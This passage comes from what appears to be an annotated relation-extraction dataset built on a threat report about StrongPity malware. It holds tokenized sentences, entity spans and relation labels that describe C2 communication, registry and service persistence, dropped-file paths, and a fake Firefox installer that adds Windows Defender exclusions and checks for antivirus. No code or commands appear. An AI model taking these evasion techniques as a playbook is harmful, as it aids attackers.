"libcurl", "pos": [5, 6], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [43, 43], "name": "winhttp", "pos": [10, 11], "index": "8_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [49, 49], "name": "C2", "pos": [16, 17], "index": "9_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [56, 56], "name": "registry", "pos": [5, 6], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [71, 71], "name": "service", "pos": [20, 21], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [74, 74], "name": "service", "pos": [1, 2], "index": "12_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [85, 85], "name": "executable", "pos": [2, 3], "index": "13_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [93, 93], "name": "C2 contact module", "pos": [10, 13], "index": "14_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [111, 111], "name": "C : \\DOCUME~1\\ < USER > ~1\\LOCALS~1\\Temp\\", "pos": [11, 18], "index": "15_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [145, 145], "name": "ini.php", "pos": [15, 16], "index": "16_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [147, 147], "name": "info.php", "pos": [17, 18], "index": "17_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [149, 149], "name": "parse_ini_file.php", "pos": [19, 20], "index": "18_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "ST", "evidence": [0], "h": 0, "t": 2}, {"r": "RF", "evidence": [0], "h": 0, "t": 2}, {"r": "ST", "evidence": [1, 2], "h": 5, "t": 9}, {"r": "RF", "evidence": [1, 2], "h": 5, "t": 9}, {"r": "ST", "evidence": [1, 2], "h": 6, "t": 9}, {"r": "RF", "evidence": [1, 2], "h": 6, "t": 9}, {"r": "CO", "evidence": [1], "h": 3, "t": 6}, {"r": "CO", "evidence": [1], "h": 4, "t": 5}, {"r": "ST", "evidence": [2], "h": 7, "t": 9}, {"r": "RF", "evidence": [2], "h": 7, "t": 9}, {"r": "ST", "evidence": [2], "h": 8, "t": 9}, {"r": "RF", "evidence": [2], "h": 8, "t": 9}, {"r": "RD", "evidence": [2, 3], "h": 8, "t": 10}, {"r": "RD", "evidence": [2, 3], "h": 8, "t": 10}, {"r": "WR", "evidence": [2, 3], "h": 8, "t": 10}, {"r": "CO", "evidence": [3, 4], "h": 11, "t": 12}, {"r": "RD", "evidence": [3, 4, 5], "t": 10, "h": 13}, {"r": "RD", "evidence": [3, 4, 5], "t": 10, "h": 13}, {"r": "WR", "evidence": [3, 4, 5], "t": 10, "h": 13}, {"r": "FR", "evidence": [5], "h": 13, "t": 14}, {"r": "WR", "evidence": [5, 6], "h": 13, "t": 15}, {"r": "WR", "evidence": [5, 6, 7], "h": 13, "t": 16}, {"r": "WR", "evidence": [5, 6, 7], "h": 13, "t": 17}, {"r": "WR", "evidence": [5, 6, 7], "h": 13, "t": 18}]}, {"title": "641-5", "sents": [["Main", "differences", "between", "StrongPity2", "and", "StrongPity3", "StrongPity3", "is", "the", "evolution", "of", "StrongPity2", ",", "with", "a", "few", "differences", "."], ["The", "latter", "does", "not", "use", "libcurl", "anymore", "and", "now", "uses", "winhttp", "to", "perform", "all", "requests", "to", "C2", "."], ["The", "usage", "of", "the", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "registry", "key", "has", "a", "persistence", "mechanism", "that", "has", "been", "replaced", "by", "the", "creation", "of", "a", "service", "."], ["This", "service", "changes", "its", "name", "from", "package", "to", "package", "."], ["The", "service", "executable", "'s", "only", "job", "is", "to", "launch", "the", "C2", "contact", "module", "upon", "service", "startup", "."], ["The", "dropped", "files", "are", "now", "stored", "in", "a", "folder", "located", "in", "C", ":", "\\DOCUME~1\\", "<", "USER", ">", "~1\\LOCALS~1\\Temp\\", "always", "following", "the", "same", "pattern", "similar", "to", "the", "following", ":", "4CA-B25C11-A27BC", "."], ["The", "C2", "path", "pattern", "has", "also", "changed", ",", "we", "have", "identified", "the", "following", "paths", ":", "ini.php", ",", "info.php", "and", "parse_ini_file.php", ",", "which", "are", "no", "longer", "random", "nor", "animal", "named", "based", "."], ["The", "VPNpro", "trojanized", "application", "uses", "an", "AutoRun", "registry", "key", ",", "as", "mentioned", "in", "the", "publication", "released", "before", "July", "2019", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [3, 3], "name": "StrongPity2", "pos": [3, 4], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [5, 5], "name": "StrongPity3", "pos": [5, 6], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [6, 6], "name": "StrongPity3", "pos": [6, 7], "index": "2_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [11, 11], "name": "StrongPity2", "pos": [11, 12], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [23, 23], "name": "libcurl", "pos": [5, 6], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [28, 28], "name": "winhttp", "pos": [10, 11], "index": "5_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [34, 34], "name": "C2", "pos": [16, 17], "index": "6_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [41, 41], "name": "registry", "pos": [5, 6], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [56, 56], "name": "service", "pos": [20, 21], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [59, 59], "name": "service", "pos": [1, 2], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [70, 70], "name": "executable", "pos": [2, 3], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [78, 78], "name": "C2 contact module", "pos": [10, 13], "index": "11_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [96, 96], "name": "C : \\DOCUME~1\\ < USER > ~1\\LOCALS~1\\Temp\\", "pos": [11, 18], "index": "12_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [130, 130], "name": "ini.php", "pos": [15, 16], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [132, 132], "name": "info.php", "pos": [17, 18], "index": "14_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [134, 134], "name": "parse_ini_file.php", "pos": [19, 20], "index": "15_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [147, 147], "name": "VPNpro trojanized application", "pos": [1, 4], "index": "16_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [153, 153], "name": "registry key", "pos": [7, 9], "index": "17_0"}]], "labels": [{"r": "ST", "evidence": [0, 1], "h": 2, "t": 6}, {"r": "RF", "evidence": [0, 1], "h": 2, "t": 6}, {"r": "ST", "evidence": [0, 1], "h": 3, "t": 6}, {"r": "RF", "evidence": [0, 1], "h": 3, "t": 6}, {"r": "CO", "evidence": [0], "h": 0, "t": 3}, {"r": "CO", "evidence": [0], "h": 1, "t": 2}, {"r": "ST", "evidence": [1], "h": 4, "t": 6}, {"r": "RF", "evidence": [1], "h": 4, "t": 6}, {"r": "ST", "evidence": [1], "h": 5, "t": 6}, {"r": "RF", "evidence": [1], "h": 5, "t": 6}, {"r": "RD", "evidence": [1, 2], "h": 5, "t": 7}, {"r": "RD", "evidence": [1, 2], "h": 5, "t": 7}, {"r": "WR", "evidence": [1, 2], "h": 5, "t": 7}, {"r": "CO", "evidence": [2, 3], "h": 8, "t": 9}, {"r": "RD", "evidence": [2, 3, 4], "t": 7, "h": 10}, {"r": "RD", "evidence": [2, 3, 4], "t": 7, "h": 10}, {"r": "WR", "evidence": [2, 3, 4], "t": 7, "h": 10}, {"r": "FR", "evidence": [4], "h": 10, "t": 11}, {"r": "WR", "evidence": [4, 5], "h": 10, "t": 12}, {"r": "WR", "evidence": [4, 5, 6], "h": 10, "t": 13}, {"r": "WR", "evidence": [4, 5, 6], "h": 10, "t": 14}, {"r": "WR", "evidence": [4, 5, 6], "h": 10, "t": 15}, {"r": "RD", "evidence": [7], "h": 16, "t": 17}, {"r": "WR", "evidence": [7], "h": 16, "t": 17}]}, {"title": "641-6", "sents": [["The", "latter", "does", "not", "use", "libcurl", "anymore", "and", "now", "uses", "winhttp", "to", "perform", "all", "requests", "to", "C2", "."], ["The", "usage", "of", "the", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "registry", "key", "has", "a", "persistence", "mechanism", "that", "has", "been", "replaced", "by", "the", "creation", "of", "a", "service", "."], ["This", "service", "changes", "its", "name", "from", "package", "to", "package", "."], ["The", "service", "executable", "'s", "only", "job", "is", "to", "launch", "the", "C2", "contact", "module", "upon", "service", "startup", "."], ["The", "dropped", "files", "are", "now", "stored", "in", "a", "folder", "located", "in", "C", ":", "\\DOCUME~1\\", "<", "USER", ">", "~1\\LOCALS~1\\Temp\\", "always", "following", "the", "same", "pattern", "similar", "to", "the", "following", ":", "4CA-B25C11-A27BC", "."], ["The", "C2", "path", "pattern", "has", "also", "changed", ",", "we", "have", "identified", "the", "following", "paths", ":", "ini.php", ",", "info.php", "and", "parse_ini_file.php", ",", "which", "are", "no", "longer", "random", "nor", "animal", "named", "based", "."], ["The", "VPNpro", "trojanized", "application", "uses", "an", "AutoRun", "registry", "key", ",", "as", "mentioned", "in", "the", "publication", "released", "before", "July", "2019", "."], ["Anti-virus", "checks", "on", "Firefox", "trojanized", "installer", "Before", "writing", "the", "toolkit", "into", "the", "hard", "drive", ",", "the", "fake", "Firefox", "installer", "executes", "a", "PowerShell", "command", "that", "will", "add", "the", "directories", "used", "by", "the", "malware", "to", "the", "Windows", "Defender", "exclusions", "list", "and", "prevent", "sample", "submission", "at", "the", "same", "time", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [5, 5], "name": "libcurl", "pos": [5, 6], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [10, 10], "name": "winhttp", "pos": [10, 11], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [16, 16], "name": "C2", "pos": [16, 17], "index": "2_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [23, 23], "name": "registry", "pos": [5, 6], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [38, 38], "name": "service", "pos": [20, 21], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [41, 41], "name": "service", "pos": [1, 2], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [52, 52], "name": "executable", "pos": [2, 3], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [60, 60], "name": "C2 contact module", "pos": [10, 13], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [78, 78], "name": "C : \\DOCUME~1\\ < USER > ~1\\LOCALS~1\\Temp\\", "pos": [11, 18], "index": "8_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [112, 112], "name": "ini.php", "pos": [15, 16], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [114, 114], "name": "info.php", "pos": [17, 18], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [116, 116], "name": "parse_ini_file.php", "pos": [19, 20], "index": "11_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [129, 129], "name": "VPNpro trojanized application", "pos": [1, 4], "index": "12_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [135, 135], "name": "registry key", "pos": [7, 9], "index": "13_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [165, 165], "name": "Firefox installer", "pos": [17, 19], "index": "14_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [169, 169], "name": "PowerShell command", "pos": [21, 23], "index": "15_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [175, 175], "name": "directories", "pos": [27, 28], "index": "16_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [179, 179], "name": "malware", "pos": [31, 32], "index": "17_0"}]], "labels": [{"r": "ST", "evidence": [0], "h": 0, "t": 2}, {"r": "RF", "evidence": [0], "h": 0, "t": 2}, {"r": "ST", "evidence": [0], "h": 1, "t": 2}, {"r": "RF", "evidence": [0], "h": 1, "t": 2}, {"r": "RD", "evidence": [0, 1], "h": 1, "t": 3}, {"r": "RD", "evidence": [0, 1], "h": 1, "t": 3}, {"r": "WR", "evidence": [0, 1], "h": 1, "t": 3}, {"r": "CO", "evidence": [1, 2], "h": 4, "t": 5}, {"r": "RD", "evidence": [1, 2, 3], "t": 3, "h": 6}, {"r": "RD", "evidence": [1, 2, 3], "t": 3, "h": 6}, {"r": "WR", "evidence": [1, 2, 3], "t": 3, "h": 6}, {"r": "FR", "evidence": [3], "h": 6, "t": 7}, {"r": "WR", "evidence": [3, 4], "h": 6, "t": 8}, {"r": "WR", "evidence": [3, 4, 5], "h": 6, "t": 9}, {"r": "WR", "evidence": [3, 4, 5], "h": 6, "t": 10}, {"r": "WR", "evidence": [3, 4, 5], "h": 6, "t": 11}, {"r": "RD", "evidence": [6], "h": 12, "t": 13}, {"r": "WR", "evidence": [6], "h": 12, "t": 13}, {"r": "RD", "evidence": [7], "h": 14, "t": 16}, {"r": "EX", "evidence": [7], "h": 14, "t": 15}, {"r": "WR", "evidence": [7], "h": 14, "t": 16}, {"r": "RD", "evidence": [7], "t": 16, "h": 17}]}, {"title": "641-7", "sents": [["The", "usage", "of", "the", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "registry", "key", "has", "a", "persistence", "mechanism", "that", "has", "been", "replaced", "by", "the", "creation", "of", "a", "service", "."], ["This", "service", "changes", "its", "name", "from", "package", "to", "package", "."], ["The", "service", "executable", "'s", "only", "job", "is", "to", "launch", "the", "C2", "contact", "module", "upon", "service", "startup", "."], ["The", "dropped", "files", "are", "now", "stored", "in", "a", "folder", "located", "in", "C", ":", "\\DOCUME~1\\", "<", "USER", ">", "~1\\LOCALS~1\\Temp\\", "always", "following", "the", "same", "pattern", "similar", "to", "the", "following", ":", "4CA-B25C11-A27BC", "."], ["The", "C2", "path", "pattern", "has", "also", "changed", ",", "we", "have", "identified", "the", "following", "paths", ":", "ini.php", ",", "info.php", "and", "parse_ini_file.php", ",", "which", "are", "no", "longer", "random", "nor", "animal", "named", "based", "."], ["The", "VPNpro", "trojanized", "application", "uses", "an", "AutoRun", "registry", "key", ",", "as", "mentioned", "in", "the", "publication", "released", "before", "July", "2019", "."], ["Anti-virus", "checks", "on", "Firefox", "trojanized", "installer", "Before", "writing", "the", "toolkit", "into", "the", "hard", "drive", ",", "the", "fake", "Firefox", "installer", "executes", "a", "PowerShell", "command", "that", "will", "add", "the", "directories", "used", "by", "the", "malware", "to", "the", "Windows", "Defender", "exclusions", "list", "and", "prevent", "sample", "submission", "at", "the", "same", "time", "."], ["After", "that", ",", "it", "will", "check", "if", "ESET", "or", "BitDefender", "antivirus", "are", "installed", "before", "dropping", "the", "malware", "."]], "vertexSet": [[{"type": "SF", "sent_id": 0, "global_pos": [5, 5], "name": "registry", "pos": [5, 6], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [20, 20], "name": "service", "pos": [20, 21], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [23, 23], "name": "service", "pos": [1, 2], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [34, 34], "name": "executable", "pos": [2, 3], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [42, 42], "name": "C2 contact module", "pos": [10, 13], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [60, 60], "name": "C : \\DOCUME~1\\ < USER > ~1\\LOCALS~1\\Temp\\", "pos": [11, 18], "index": "5_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [94, 94], "name": "ini.php", "pos": [15, 16], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [96, 96], "name": "info.php", "pos": [17, 18], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [98, 98], "name": "parse_ini_file.php", "pos": [19, 20], "index": "8_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [111, 111], "name": "VPNpro trojanized application", "pos": [1, 4], "index": "9_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [117, 117], "name": "registry key", "pos": [7, 9], "index": "10_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [147, 147], "name": "Firefox installer", "pos": [17, 19], "index": "11_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [151, 151], "name": "PowerShell command", "pos": [21, 23], "index": "12_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [157, 157], "name": "directories", "pos": [27, 28], "index": "13_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [161, 161], "name": "malware", "pos": [31, 32], "index": "14_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [180, 180], "name": "it", "pos": [3, 4], "index": "15_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [184, 184], "name": "ESET", "pos": [7, 8], "index": "16_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [186, 186], "name": "BitDefender", "pos": [9, 10], "index": "17_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [193, 193], "name": "malware", "pos": [16, 17], "index": "18_0"}]], "labels": [{"r": "CO", "evidence": [0, 1], "h": 1, "t": 2}, {"r": "RD", "evidence": [0, 1, 2], "t": 0, "h": 3}, {"r": "RD", "evidence": [0, 1, 2], "t": 0, "h": 3}, {"r": "WR", "evidence": [0, 1, 2], "t": 0, "h": 3}, {"r": "FR", "evidence": [2], "h": 3, "t": 4}, {"r": "WR", "evidence": [2, 3], "h": 3, "t": 5}, {"r": "WR", "evidence": [2, 3, 4], "h": 3, "t": 6}, {"r": "WR", "evidence": [2, 3, 4], "h": 3, "t": 7}, {"r": "WR", "evidence": [2, 3, 4], "h": 3, "t": 8}, {"r": "RD", "evidence": [5], "h": 9, "t": 10}, {"r": "WR", "evidence": [5], "h": 9, "t": 10}, {"r": "RD", "evidence": [6], "h": 11, "t": 13}, {"r": "EX", "evidence": [6], "h": 11, "t": 12}, {"r": "WR", "evidence": [6], "h": 11, "t": 13}, {"r": "RD", "evidence": [6], "t": 13, "h": 14}, {"r": "CO", "evidence": [6, 7], "h": 14, "t": 15}, {"r": "RD", "evidence": [7], "h": 15, "t": 16}, {"r": "RD", "evidence": [7], "h": 15, "t": 17}, {"r": "FR", "evidence": [7], "h": 15, "t": 18}]}, {"title": "641-8", "sents": [["This", "service", "changes", "its", "name", "from", "package", "to", "package", "."], ["The", "service", "executable", "'s", "only", "job", "is", "to", "launch", "the", "C2", "contact", "module", "upon", "service", "startup", "."], ["The", "dropped", "files", "are", "now", "stored", "in", "a", "folder", "located", "in", "C", ":", "\\DOCUME~1\\", "<", "USER", ">", "~1\\LOCALS~1\\Temp\\", "always", "following", "the", "same", "pattern", "similar", "to", "the", "following", ":", "4CA-B25C11-A27BC", "."], ["The", "C2", "path", "pattern", "has", "also", "changed", ",", "we", "have", "identified", "the", "following", "paths", ":", "ini.php", ",", "info.php", "and", "parse_ini_file.php", ",", "which", "are", "no", "longer", "random", "nor", "animal", "named", "based", "."], ["The", "VPNpro", "trojanized", "application", "uses", "an", "AutoRun", "registry", "key", ",", "as", "mentioned", "in", "the", "publication", "released", "before", "July", "2019", "."], ["Anti-virus", "checks", "on", "Firefox", "trojanized", "installer", "Before", "writing", "the", "toolkit", "into", "the", "hard", "drive", ",", "the", "fake", "Firefox", "installer", "executes", "a", "PowerShell", "command", "that", "will", "add", "the", "directories", "used", "by", "the", "malware", "to", "the", "Windows", "Defender", "exclusions", "list", "and", "prevent", "sample", "submission", "at", "the", "same", "time", "."], ["After", "that", ",", "it", "will", "check", "if", "ESET", "or", "BitDefender", "antivirus", "are", "installed", "before", "dropping", "the", "malware", "."], ["The", "setup", "deploys", "three", "files", "which", "are", "part", "of", "the", "toolset", ":", "rmaserv.exe", ",", "winprint32.exe", "and", "mssqldbserv.xml", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "service", "pos": [1, 2], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [12, 12], "name": "executable", "pos": [2, 3], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [20, 20], "name": "C2 contact module", "pos": [10, 13], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [38, 38], "name": "C : \\DOCUME~1\\ < USER > ~1\\LOCALS~1\\Temp\\", "pos": [11, 18], "index": "3_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [72, 72], "name": "ini.php", "pos": [15, 16], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [74, 74], "name": "info.php", "pos": [17, 18], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [76, 76], "name": "parse_ini_file.php", "pos": [19, 20], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [89, 89], "name": "VPNpro trojanized application", "pos": [1, 4], "index": "7_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [95, 95], "name": "registry key", "pos": [7, 9], "index": "8_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [125, 125], "name": "Firefox installer", "pos": [17, 19], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [129, 129], "name": "PowerShell command", "pos": [21, 23], "index": "10_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [135, 135], "name": "directories", "pos": [27, 28], "index": "11_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [139, 139], "name": "malware", "pos": [31, 32], "index": "12_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [158, 158], "name": "it", "pos": [3, 4], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [162, 162], "name": "ESET", "pos": [7, 8], "index": "14_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [164, 164], "name": "BitDefender", "pos": [9, 10], "index": "15_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [171, 171], "name": "malware", "pos": [16, 17], "index": "16_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [174, 174], "name": "setup", "pos": [1, 2], "index": "17_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [185, 185], "name": "rmaserv.exe", "pos": [12, 13], "index": "18_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [187, 187], "name": "winprint32.exe", "pos": [14, 15], "index": "19_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [189, 189], "name": "mssqldbserv.xml", "pos": [16, 17], "index": "20_0"}]], "labels": [{"r": "FR", "evidence": [1], "h": 1, "t": 2}, {"r": "WR", "evidence": [1, 2], "h": 1, "t": 3}, {"r": "WR", "evidence": [1, 2, 3], "h": 1, "t": 4}, {"r": "WR", "evidence": [1, 2, 3], "h": 1, "t": 5}, {"r": "WR", "evidence": [1, 2, 3], "h": 1, "t": 6}, {"r": "RD", "evidence": [4], "h": 7, "t": 8}, {"r": "WR", "evidence": [4], "h": 7, "t": 8}, {"r": "RD", "evidence": [5], "h": 9, "t": 11}, {"r": "EX", "evidence": [5], "h": 9, "t": 10}, {"r": "WR", "evidence": [5], "h": 9, "t": 11}, {"r": "RD", "evidence": [5], "t": 11, "h": 12}, {"r": "CO", "evidence": [5, 6], "h": 12, "t": 13}, {"r": "RD", "evidence": [6], "h": 13, "t": 14}, {"r": "RD", "evidence": [6], "h": 13, "t": 15}, {"r": "FR", "evidence": [6], "h": 13, "t": 16}, {"r": "FR", "evidence": [7], "h": 17, "t": 18}, {"r": "FR", "evidence": [7], "h": 17, "t": 19}, {"r": "FR", "evidence": [7], "h": 17, "t": 20}]}, {"title": "641-9", "sents": [["The", "service", "executable", "'s", "only", "job", "is", "to", "launch", "the", "C2", "contact", "module", "upon", "service", "startup", "."], ["The", "dropped", "files", "are", "now", "stored", "in", "a", "folder", "located", "in", "C", ":", "\\DOCUME~1\\", "<", "USER", ">", "~1\\LOCALS~1\\Temp\\", "always", "following", "the", "same", "pattern", "similar", "to", "the", "following", ":", "4CA-B25C11-A27BC", "."], ["The", "C2", "path", "pattern", "has", "also", "changed", ",", "we", "have", "identified", "the", "following", "paths", ":", "ini.php", ",", "info.php", "and", "parse_ini_file.php", ",", "which", "are", "no", "longer", "random", "nor", "animal", "named", "based", "."], ["The", "VPNpro", "trojanized", "application", "uses", "an", "AutoRun", "registry", "key", ",", "as", "mentioned", "in", "the", "publication", "released", "before", "July", "2019", "."], ["Anti-virus", "checks", "on", "Firefox", "trojanized", "installer", "Before", "writing", "the", "toolkit", "into", "the", "hard", "drive", ",", "the", "fake", "Firefox", "installer", "executes", "a", "PowerShell", "command", "that", "will", "add", "the", "directories", "used", "by", "the", "malware", "to", "the", "Windows", "Defender", "exclusions", "list", "and", "prevent", "sample", "submission", "at", "the", "same", "time", "."], ["After", "that", ",", "it", "will", "check", "if", "ESET", "or", "BitDefender", "antivirus", "are", "installed", "before", "dropping", "the", "malware", "."], ["The", "setup", "deploys", "three", "files", "which", "are", "part", "of", "the", "toolset", ":", "rmaserv.exe", ",", "winprint32.exe", "and", "mssqldbserv.xml", "."], ["Execution", "flow", "As", "the", "execution", "flow", "shows", ",", "the", "setup", "will", "only", "execute", "rmaserv.exe", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [2, 2], "name": "executable", "pos": [2, 3], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [10, 10], "name": "C2 contact module", "pos": [10, 13], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [28, 28], "name": "C : \\DOCUME~1\\ < USER > ~1\\LOCALS~1\\Temp\\", "pos": [11, 18], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [62, 62], "name": "ini.php", "pos": [15, 16], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [64, 64], "name": "info.php", "pos": [17, 18], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [66, 66], "name": "parse_ini_file.php", "pos": [19, 20], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [79, 79], "name": "VPNpro trojanized application", "pos": [1, 4], "index": "6_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [85, 85], "name": "registry key", "pos": [7, 9], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [115, 115], "name": "Firefox installer", "pos": [17, 19], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [119, 119], "name": "PowerShell command", "pos": [21, 23], "index": "9_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [125, 125], "name": "directories", "pos": [27, 28], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [129, 129], "name": "malware", "pos": [31, 32], "index": "11_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [148, 148], "name": "it", "pos": [3, 4], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [152, 152], "name": "ESET", "pos": [7, 8], "index": "13_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [154, 154], "name": "BitDefender", "pos": [9, 10], "index": "14_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [161, 161], "name": "malware", "pos": [16, 17], "index": "15_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [164, 164], "name": "setup", "pos": [1, 2], "index": "16_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [175, 175], "name": "rmaserv.exe", "pos": [12, 13], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [177, 177], "name": "winprint32.exe", "pos": [14, 15], "index": "18_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [179, 179], "name": "mssqldbserv.xml", "pos": [16, 17], "index": "19_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [190, 190], "name": "setup", "pos": [9, 10], "index": "20_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [194, 194], "name": "rmaserv.exe", "pos": [13, 14], "index": "21_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "WR", "evidence": [0, 1, 2], "h": 0, "t": 3}, {"r": "WR", "evidence": [0, 1, 2], "h": 0, "t": 4}, {"r": "WR", "evidence": [0, 1, 2], "h": 0, "t": 5}, {"r": "RD", "evidence": [3], "h": 6, "t": 7}, {"r": "WR", "evidence": [3], "h": 6, "t": 7}, {"r": "RD", "evidence": [4], "h": 8, "t": 10}, {"r": "EX", "evidence": [4], "h": 8, "t": 9}, {"r": "WR", "evidence": [4], "h": 8, "t": 10}, {"r": "RD", "evidence": [4], "t": 10, "h": 11}, {"r": "CO", "evidence": [4, 5], "h": 11, "t": 12}, {"r": "RD", "evidence": [5], "h": 12, "t": 13}, {"r": "RD", "evidence": [5], "h": 12, "t": 14}, {"r": "FR", "evidence": [5], "h": 12, "t": 15}, {"r": "FR", "evidence": [6], "h": 16, "t": 17}, {"r": "FR", "evidence": [6], "h": 16, "t": 18}, {"r": "FR", "evidence": [6], "h": 16, "t": 19}, {"r": "CO", "evidence": [6, 7], "h": 16, "t": 20}, {"r": "EX", "evidence": [7], "h": 20, "t": 21}]}, {"title": "641-10", "sents": [["The", "dropped", "files", "are", "now", "stored", "in", "a", "folder", "located", "in", "C", ":", "\\DOCUME~1\\", "<", "USER", ">", "~1\\LOCALS~1\\Temp\\", "always", "following", "the", "same", "pattern", "similar", "to", "the", "following", ":", "4CA-B25C11-A27BC", "."], ["The", "C2", "path", "pattern", "has", "also", "changed", ",", "we", "have", "identified", "the", "following", "paths", ":", "ini.php", ",", "info.php", "and", "parse_ini_file.php", ",", "which", "are", "no", "longer", "random", "nor", "animal", "named", "based", "."], ["The", "VPNpro", "trojanized", "application", "uses", "an", "AutoRun", "registry", "key", ",", "as", "mentioned", "in", "the", "publication", "released", "before", "July", "2019", "."], ["Anti-virus", "checks", "on", "Firefox", "trojanized", 